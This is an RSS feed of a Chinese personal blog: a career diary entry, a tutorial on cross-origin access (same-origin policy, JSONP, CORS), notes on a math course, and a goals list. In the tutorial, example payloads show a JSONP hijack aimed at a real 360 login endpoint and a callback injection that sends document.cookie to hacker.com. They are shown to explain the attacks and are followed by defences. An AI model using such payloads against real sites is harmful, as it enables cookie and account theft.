<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>咖啡不苦</title>
    <description>赖晨东的博客 | 咖啡不苦</description>
    <link>http://laichendong.com/</link>
    <atom:link href="http://laichendong.com/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Sun, 28 Jun 2020 18:37:51 +0800</pubDate>
    <lastBuildDate>Sun, 28 Jun 2020 18:37:51 +0800</lastBuildDate>
    <generator>Jekyll v3.8.5</generator>
    
      <item>
        <title>log-2020年06月23日</title>
        <description>&lt;p&gt;2020年06月23日 晴&lt;/p&gt;

&lt;p&gt;听吴军的《阅读与写作课》提到用写日记的方式来训练自己的协作能力。就想着也记录一下。但，这是昨天的事儿了。&lt;/p&gt;

&lt;p&gt;有一个猎头推荐钉钉的岗位，开始是想去了解一下外面的机会，看看自己还行不行。打算去面试试试的。想起学良去年举家去了杭州钉钉，就问他大概情况。学良在京东的时候，交情也不深，只是隐约觉得这哥们还不错，挺厉害的。本是想随口问问，也没想如何。上午发了一条微信，半天也不见回话。心想：果然，没啥交情，现在人家离开了京东，更是没啥交集了。没想到下午给我回了一句，“打个电话？”我打过去之后直接聊了一个小时。与其说是聊了一个小时，倒不如说是他说了一个小时。从对杭州的看法，到对阿里的看法，到对钉钉的看法，从他的视角，对比北京与杭州，阿里与京东。说了很多，记住几点，1、钉钉很累；  2、阿里的数字化管理很先进，没准备好别试，免得留下不好的印象；3、既然想要出来，就要拼，既然要拼，进阿里就要去杭州。说的都挺在理的，也打消了我想去面试的想法。另外也感叹阿里的厉害，把厉害的人都吸引过去了，并且深度认同阿里。&lt;/p&gt;

&lt;p&gt;由于近半年的工作上的变动，让自己又感觉有些迷茫，觉得自己不够厉害了，出去没法拿到更高的薪水和待遇，不知道自己的核心竞争力是什么了。所谓的管理，也说不出123，人家面试找人，貌似也不看这些。&lt;/p&gt;

&lt;p&gt;自己招聘看到一些年纪大的，还在找一线工作，路宏波去年离职，今年就已经再进不了京东了。和乐哥聊天说我现在再折回技术路线有点晚了。真的晚了吗？ 不，一定不晚。&lt;/p&gt;

&lt;p&gt;保持对前沿技术动向的学习。同时将基础技术吃透吧。东东，你可以的！&lt;/p&gt;

</description>
        <pubDate>Tue, 23 Jun 2020 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2020/06/23/log-2020-06-23/</link>
        <guid isPermaLink="true">http://laichendong.com/2020/06/23/log-2020-06-23/</guid>
        
        
      </item>
    
      <item>
        <title>一篇聊透跨域</title>
        <description>&lt;p&gt;前几天面试一小哥哥，说到跨域问题，说的语焉不详的。所以将相关知识点整理了一下，成文如下：&lt;/p&gt;

&lt;h2 id=&quot;什么是跨域问题&quot;&gt;什么是跨域问题&lt;/h2&gt;

&lt;p&gt;通常大家所说的跨域问题，就是脚本要访问一个别的域名的数据时，发现被浏览器阻止了，访问不了，然后想各种办法去实现这个跨域名的数据读取，就被笼统的称作&lt;strong&gt;跨域问题&lt;/strong&gt;；但其实，跨域问题不是&lt;strong&gt;跨域&lt;/strong&gt;，而是&lt;strong&gt;跨源（cross-origin）&lt;/strong&gt;问题。现代浏览器里有一个叫做&lt;strong&gt;同源策略&lt;/strong&gt;的机制，正是这个机制阻止了资源的跨域访问。那么什么是同源策略，以及为什么要有这个策略呢？&lt;/p&gt;

&lt;h2 id=&quot;同源策略same-origin-policy&quot;&gt;同源策略（Same Origin Policy）&lt;/h2&gt;

&lt;p&gt;简单的说，同源策略是浏览器的一种&lt;strong&gt;安全机制&lt;/strong&gt;。他规定&lt;strong&gt;从某一个源（服务端）加载（到浏览器端）的页面（脚本）只能&lt;em&gt;访问（向xxx发请求）&lt;/em&gt;与他“&lt;em&gt;同源&lt;/em&gt;”的页面的&lt;em&gt;资源&lt;/em&gt;&lt;/strong&gt;。那“同源”里的&lt;strong&gt;源&lt;/strong&gt;又是什么意思呢？&lt;strong&gt;同源是指两个URL里的：协议（protocol），端口（port），域名（hosts）完全相同&lt;/strong&gt;，也就是URL的Scheme一致。例如：&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://abc.com  和 https://abc.com 不同源，协议不同
http://abc.com 和 http://abc.com:8080 不同源，端口不同
http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;也就是说，上面这些页面之间都不能发送请求。你可能会感到奇怪，“我的网页的静态资源都放在cdn域名里，比如公共js，然后加载到页面执行，一点问题都没有啊”，这是不是违法了同源策略？嗯，所以同源策略里规定的“&lt;strong&gt;访问&lt;/strong&gt;”是一个相对模糊的概念。一般来说：&lt;strong&gt;内嵌一个跨源的资源是被允许的，但是读取一个跨源的资源是不允许的。&lt;/strong&gt;比如，你可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;iframe src=''/&amp;gt;&lt;/code&gt;嵌入一个跨源的页面（当然，被嵌入的页面的服务器端可以设置&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt;响应头来控制自己允不允许被iframe嵌入，可以在一定程度上防止黑客制作钓鱼网站），但不能用js获得这个被嵌入的页面里的dom对象引用。&lt;/p&gt;

&lt;p&gt;更具体的来说，下面列出来哪些动作被允许，哪些动作不被允许。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1、**iframe**，  一般来说，用src跨源嵌入是可以的，但不让读取里面的内容

2、**css**，可以用link标签和@import来嵌入，但是要正确的设置Content-Type

3、**表单**，表单可以通过action属性提交到一个跨源的目的地页面，也就是说，跨源写是允许的

4、**图片**，图片可以用img标签嵌入，但是如果从一个跨源的地方读一张图片然后画到canvas上，则不允许（这相当于读了图片的内容）

5、**多媒体内容**，同理，视频和音频这些内容是可以通过video和audio标签内嵌到页面上来的。

6、**脚本**，脚本当然可以用script标签嵌入，但不能访问一些特定的api，比如通过XMLHttpRequest或Fetch发送跨域资源请求。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;为什么要有同源策略&quot;&gt;为什么要有同源策略？&lt;/h2&gt;

&lt;p&gt;总而言之，是搞了很多的限制。那为什么要搞这么多的限制呢，怪麻烦的。刚提到，同源策略是一个重要的安全策略。也就是说，是浏览器为了web安全而不得不搞出来的一种限制。想象一下，如果没有这个限制。一个源attacker.com的脚本可以读取xxx.bank.com页面的信息和往xxx.bank.com发请求的话。attacher就可以用脚本读取你在bank.com里的账号和密码，发起转账，等等都可以了。所以，同源策略，保护的是被跨源访问的域。这点是很多人没有彻底理解跨域问题的根源。&lt;/p&gt;

&lt;h2 id=&quot;但实际就有跨源资源访问的需求怎么办&quot;&gt;但实际就有跨源资源访问的需求怎么办？&lt;/h2&gt;

&lt;p&gt;同源策略安全是安全，但他是一刀切的方案，实际情况是真的有很多时候需要跨源访问资源：现代网站很多用域名做了垂直拆分，甚至很多本来就是公共服务，就希望被所有人访问到，比如天气预报数据等等，都被这个同源策略所阻止了。在之前，比较著名和流行的方式就是采用&lt;strong&gt;JSONP&lt;/strong&gt;技术来实现跨源访问。&lt;/p&gt;

&lt;h2 id=&quot;jsonpjson-with-padding技术&quot;&gt;JSONP（JSON with padding）技术&lt;/h2&gt;

&lt;p&gt;这是一种被普遍使用的，绕过浏览器同源策略的数据共享方法。他的基本思想是，在网页里插入一个&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script /&amp;gt;&lt;/code&gt;元素，用script标签的src属性加载一个跨源脚本（这是被允许的），这个脚本的服务端，将要共享的数据以JSON的格式放到一个指定名字的回调函数的入参里（with padding）传回来。页面的回调函数实现就拿到跨源的共享数据了。&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**
* 工具函数，往页面里插入一个指定src的script标签，以发起请求
* 其实也可以发起ajax请，很多三方库（比如jQuery）都有封装
*/&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addScriptTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'script'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 调用工具函数，发起请求，并告诉服务端，回调函数名字叫foo&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;addScriptTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://example.com/ip?callback=foo'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 服务端返回JSON格式的数据，并 放在一个叫 foo的函数调用的入参里，如下：&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// foo({&quot;ip&quot;: &quot;8.8.8.8&quot;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
* 回调函数，服务端返回的内容，会回调这个函数，并且把数据作为参数传入，这样就实现了跨源数据共享的目的
*/&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Your public IP address is: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从原理上来看，JSONP其实是一种Hacking技术，用一种巧妙的方式绕开了同源策略的限制，虽然能实现跨源访问的目的，但其实也会带来一些安全问题。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1、CSRF（ Cross-site request forgery 跨站请求伪造）攻击&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;如果通过JSONP获取的数据是敏感数据（比如用户登录之后才能读取到的数据），攻击者可以构造一个这样的请求，藏在某个页面里，如果用户在登录的情况下访问了那个页面（攻击者可以引诱被攻击者访问），就会在不知情的情况下将自己的数据泄露。比如&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wooyun&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  	&lt;span class=&quot;c1&quot;&gt;// 这里可以干坏事，比如将用户的用户名，邮箱等发送到指定的地址， &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 把这坨代码放注入到360的某个子域的页面里，就等着有人上钩了&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://js.login.360.cn/?o=sso&amp;amp;m=info&amp;amp;func=wooyun&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;也就是说，攻击者在被攻击者不知情的情况下向某个JSONP的服务端发送了请求（如果这个请求是转账？^_^）。所以要防止这种攻击，服务端除了要验证用户的登录状态，还要验证请求的Refer，增加token校验等等。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2、callback函数名可自定义，导致注入风险&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;因为，callback参数值会作为函数名传个服务器并传回来，在浏览器端执行，如果这个参数不是一个正常的函数名，而是一个表达式，甚至是一段脚本呢？就会有问题了。比如&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/pay?callback=&amp;lt;srcript&amp;gt;$.get(&quot;http://hacker.com?cookie=&quot;+document.cookie)&amp;lt;/script&amp;gt;'&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;攻击者还可以构造一些更加精巧的callback内容，实现RFD攻击。&lt;/p&gt;

&lt;p&gt;要防止这种攻击，第一步要做的就是对callback参数的内容做转义，第二是要对返回的内容设置&lt;code class=&quot;highlighter-rouge&quot;&gt;conten-type=application/json&lt;/code&gt; （不能被执行）而不是&lt;code class=&quot;highlighter-rouge&quot;&gt;application/javascript&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;想要更安全优雅的实现跨源资源共享该怎么办呢？其实早在2014年的时候w3c就通过了&lt;strong&gt;跨源资源共享（Cross-Origin Resource Sharing (CORS)）&lt;/strong&gt; 的标准。&lt;/p&gt;

&lt;h2 id=&quot;corscross-origin-resource-sharing跨源资源共享-技术&quot;&gt;CORS（Cross-Origin Resource Sharing）跨源资源共享 技术&lt;/h2&gt;

&lt;p&gt;上文说到，&lt;strong&gt;浏览器是为了保护被跨源访问的服务不被别人随意访问才不得不设置了同源策略，并且这种一刀切的方式带来了许多不便。那如果某个源的服务器明确告诉浏览器说，我这个服务是允许别人来访问的，你不用使用同源策略来禁止别人访问我，那不就没问题了&lt;/strong&gt;。这就是cors机制的基本原理。&lt;/p&gt;

&lt;p&gt;最基本的实现CORS和把大象装冰箱一样，总共分三步：&lt;/p&gt;

&lt;p&gt;1、浏览器发现是一个跨源请求，就在请求头上加一个字段&lt;code class=&quot;highlighter-rouge&quot;&gt;Origin&lt;/code&gt;；包括协议，域名，端口。告诉被请求的服务端说，我是谁。&lt;/p&gt;

&lt;p&gt;2、服务器收到请求，应该检查这个Origin是不是被允许的访问来源，如果是被允许的，则在响应头上加上&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;，这个值可以是一个具体的origin，也可是是&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;表示允许所有源访问。&lt;/p&gt;

&lt;p&gt;3、浏览器收到服务器的响应，检查是否有&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;头，如果有，才能把具体的响应体返回给请求发送者，否则报错，告诉请求发起方&lt;code class=&quot;highlighter-rouge&quot;&gt;access blocked by CORS policy&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;其实，我们发现，CORS虽然阻止了将响应返回个请求发送者，但实际上请求是有真的发送到服务端的！所以当我们在做服务端接口的时候，一定要注意先要检查请求的Origin，再决定是否做相应的动作。以免形成事实上的攻击。这个在nginx配置上一定要注意，不能无脑的反射Origin。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;复杂请求的先导请求&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;我觉得也是出于这个原因，CORS把请求分成普通请求和复杂请求（complex request），对于复杂请求（万一请求对服务端有伤害的请求？）先用一个先导请求（preflight request）去问下服务端是否接受这类请求，得到确认后再发送具体请求。先导请求是浏览器自动发送的，并且服务端可以设置缓存建议。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;用cors发送cookie？&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;除了Allow Origin这种源的白名单机制，cors还可以通过cookie实现对用户的身份认证，在请求头上加上 &lt;code class=&quot;highlighter-rouge&quot;&gt;credentials: 'include'&lt;/code&gt; 可以让请求带上cookie发送， 为了安全考虑，cors规定如果用了，则&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;必须指定具体的值，不能为&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;&lt;/p&gt;

</description>
        <pubDate>Tue, 09 Jun 2020 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2020/06/09/cross_domain/</link>
        <guid isPermaLink="true">http://laichendong.com/2020/06/09/cross_domain/</guid>
        
        <category>web</category>
        
        <category>跨域</category>
        
        
      </item>
    
      <item>
        <title>mathematics</title>
        <description>&lt;h2 id=&quot;数学通识50讲&quot;&gt;《数学通识50讲》&lt;/h2&gt;

&lt;h3 id=&quot;作者简介&quot;&gt;作者简介&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;吴军&lt;/strong&gt;（1967年4月 57岁），出生于北京。1989年毕业于&lt;a href=&quot;https://zh.wikipedia.org/wiki/清華大學&quot;&gt;清华大学&lt;/a&gt;计算机系和电子工程系，1993年至1996年执教于清华。1996年留学于美国约翰霍普金斯大学，2002年荣获霍普金斯大学计算机科学博士学位。&lt;/p&gt;

  &lt;p&gt;2002年6月至2010年4月,吴军曾担任Google研究院（Google Research）的资深研究员，著名自然语言处理专家，&lt;a href=&quot;https://zh.wikipedia.org/wiki/約翰霍普金斯大學&quot;&gt;约翰霍普金斯大学&lt;/a&gt;博士。在&lt;a href=&quot;https://zh.wikipedia.org/wiki/Google&quot;&gt;Google&lt;/a&gt;主要的贡献包括&lt;a href=&quot;https://zh.wikipedia.org/w/index.php?title=中日韓搜索算法&amp;amp;action=edit&amp;amp;redlink=1&quot;&gt;中日韩搜索算法&lt;/a&gt;，Google&lt;a href=&quot;https://zh.wikipedia.org/wiki/反垃圾邮件&quot;&gt;反垃圾邮件&lt;/a&gt;的创始人，和&lt;a href=&quot;https://zh.wikipedia.org/w/index.php?title=中日韓搜索&amp;amp;action=edit&amp;amp;redlink=1&quot;&gt;中日韩搜索&lt;/a&gt;部门的创始人。美国共和党党员[&lt;a href=&quot;https://zh.wikipedia.org/wiki/吴军_(计算机科学家)#cite_note-2&quot;&gt;2]&lt;/a&gt;。&lt;/p&gt;

  &lt;p&gt;吴军2010年离开Google后，2010年4月至2012年8月担任腾讯主管搜索的副总裁、约翰霍普金斯大学工学院董事。&lt;/p&gt;

  &lt;p&gt;2012年8月离开腾讯，2012年9月至2014年9月回到Google担任谷歌主任，工程师兼资深研究员。&lt;/p&gt;

  &lt;p&gt;2014年9月至今担任丰元资本(Amino Captial)合伙人。2016年9月至今担任中信出版独立董事。&lt;/p&gt;

  &lt;p&gt;除了在工程和研究上的贡献，他是畅销书《数学之美》、《浪潮之巅》、《硅谷之谜》、《文明之光》、《大学之路》和《智能时代》的作者。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;为什么要学数学通识&quot;&gt;为什么要学数学通识？&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;通识教育&lt;/strong&gt;的思想起源于19世纪，当时认为大学里的专业太过于专了，导致知识严重割裂，于是创造出通识教育，目的是培养学生能独立思考、且对不同的学科有所认识，以至能将不同的知识融会贯通。自20世纪后，通识教育已广泛成为欧美大学的一项必修科目。吴军认为，世界上的顶级名校和二流大学相比，专业课其实亮点不太突出，关键是同时教育做得好，有了好的同事教育的基础，在职业道路上才能走的更远。&lt;/p&gt;

&lt;p&gt;他还认为，成年人接受数学通识教育，只要做到一点就够了，就是从理解初等数学到理解高等数学。也就是把自己对所有和数学相关的概念和方法从静态的，具体的上升到动态的，规律的就可以了。&lt;/p&gt;

&lt;p&gt;具体内容因为太多了，一共50讲，大家可用自己去看，大概是分了7个模块，每个模块有一个主题思想，我觉得很重要，分别是：数学的线索-从猜想到定理的应用；数的概念-从具体到抽象；几何学-一切源自公理和逻辑；代数学-用数量描绘世界；微积分-动态的世界观；概率，统计，博弈论-从确定到不确定；数学的基础作用与其他学科的关系。基本上认为涵盖了从小学到大学的数学教育的精髓。其实这点我感触还是挺深的，这里不介绍具体内容，只介绍几个数学思维：&lt;/p&gt;

&lt;h4 id=&quot;一不轻易相信没有根据的结论一切要从公理出发用逻辑得到结论&quot;&gt;一、不轻易相信没有根据的结论，一切要从公理出发，用逻辑得到结论&lt;/h4&gt;

&lt;p&gt;数学是一个公理化的体系，这既是数学的特点，也是数学的方法。整个欧氏几何都构建在5条基本公理和5条几何公理之上的。&lt;/p&gt;

&lt;p&gt;​	1、两点之间有且仅有一条直线&lt;/p&gt;

&lt;p&gt;​	2、直线可以往两端无限延长&lt;/p&gt;

&lt;p&gt;​	3、以任意一点为圆心，任意长度为半径，可以画圆&lt;/p&gt;

&lt;p&gt;​	4、所有直角都相等&lt;/p&gt;

&lt;p&gt;​	5、过直线外一点，有且仅有一条平行线&lt;/p&gt;

&lt;p&gt;整个几何学就是建立在这些公理之上，他的发展依靠对新定理的发现和通过逻辑推理证明这些定理。比如通过这些公理可以证明对顶角相等，进而又可以证明同位角相等等等定理，后人可以站在前人的肩膀上继续工作，其实计算机也是一样的，计算机最底层只能做二进制的逻辑运算，然后通过逻辑运算可以做出加法器，乘法器，最终实现像我们看到的播放视频，处理图片这种高级效果。我们现在很少再去写二分查找，快速排序算法的实现也是一样，因为这些都固化到了底层实现里。我们需要做的更多的是关注这个世界已经发展到了什么阶段，有什么工具可以使用，我们要解决哪些实际问题，而这些实际问题可以通过哪些工具解决。比如昨天老贾分享的用flutter这个工具来解决跨平台移动开发的问题。&lt;/p&gt;

&lt;h4 id=&quot;二在解决问题之前先搞清楚问题特别是搞清楚问题的定义&quot;&gt;二、在解决问题之前，先搞清楚问题，特别是搞清楚问题的定义&lt;/h4&gt;

&lt;p&gt;这点的感触就更多了，我们程序员经常容易犯的一个毛病就是上来就想解决方案，陷入到无限的细节里面，而缺乏对问题的全面认识。比如我们要解决研发效能的问题，很容易一上来就想什么敏捷开发啊，自动化测试啊，持续集成啊，devops啊之类的方法，但比较少去向“研发效能”这四个字代表什么含义，是并行开发的需求多？是需求的响应速度快？还是加班时长比较长？就是我们应该用个什么指标体系去衡量他，可能更重要，大多数时候，搞清楚了问题的定义，基本也就知道怎么解决了。对应到我们系统的需求上也是同样的道理。&lt;/p&gt;

&lt;h4 id=&quot;三各种知识体系是相通的&quot;&gt;三、各种知识体系是相通的&lt;/h4&gt;

&lt;p&gt;他这里的讲的各种知识体系更多的是数学的各种分支，其实数学和其他自然科学也是相通的，甚至可以说数学是自然科学的基础。比如微积分就是牛顿用来解决物理问题而发明的数学工具，而电子计算机是图灵用来破解二战期间德国的密码而发明的工具。这也能一部分解释那些看起来某方面很厉害的人好多方面都挺厉害的。我们从牛逼的大学里校招那些学霸大概率写代码也不错的原因也是一样的。&lt;/p&gt;

&lt;h4 id=&quot;四用动态发展的眼光看世界&quot;&gt;四、用动态，发展的眼光看世界&lt;/h4&gt;

&lt;p&gt;这个吴军讲的是无穷大和无穷小这两个概念的时候降到的。讲数学概念的时候讲的很细致很精彩，抽象到这个高度之后反而觉得很鸡汤了。包括罗振宇的跨年演讲里去年提到的小趋势，今年提到的躬身入局，中国制造业的变化都有讲到这个思维。这个大家了解，我就不多说了。总共就是这4个数学思维。&lt;/p&gt;

&lt;p&gt;最后，我还想了一个问题：&lt;strong&gt;都说计算机是数学的一个分支，那我这个“搞计算机的”怎么完全没有感觉自己是个“搞数学的”？&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;1、我现在做的工作都是非常顶层的，主要是应用计算机来完成工作，而不是设计一个cpu指令集或者设计一种加密算法。&lt;/p&gt;

&lt;p&gt;2、我之前对数学有非常深的误解，甚至根本就没怎么摸到数学的门，以为数学就是加减乘除的考试。直到大数据，人工智能的兴起，数学才又走进了我的世界。做了风向标，才理解了平均值，中位数和方差这些很基本的概念；了解了一些AI的基本原理才了解了统计，概率这些不确定性才是我们这个世界的常态。非此即彼，非黑即白才是特殊情况。&lt;/p&gt;

&lt;p&gt;总之，我觉得吴军这个专栏非常不错，推荐大家可以去读一下。&lt;/p&gt;

</description>
        <pubDate>Tue, 07 Jan 2020 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2020/01/07/mathematics/</link>
        <guid isPermaLink="true">http://laichendong.com/2020/01/07/mathematics/</guid>
        
        <category>数学通识</category>
        
        <category>吴军</category>
        
        
        <category>读书笔记</category>
        
      </item>
    
      <item>
        <title>2019-flags</title>
        <description>&lt;h3 id=&quot;自我成长&quot;&gt;自我成长：&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 报考清华经管MBA
- 把自己变成AI人才，多写点代码？
- 看书：月均1本
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;提升生活情趣&quot;&gt;提升生活情趣：&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 品味：保持工位，家里的干净整洁和美感
- 画画：系统的学学素描，打型，多画
- 摄影：多拍
- 跑步：700/1000/1200   完成一次全马
- 游泳：学会踩水  2min以上
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;责任&quot;&gt;责任：&lt;/h3&gt;

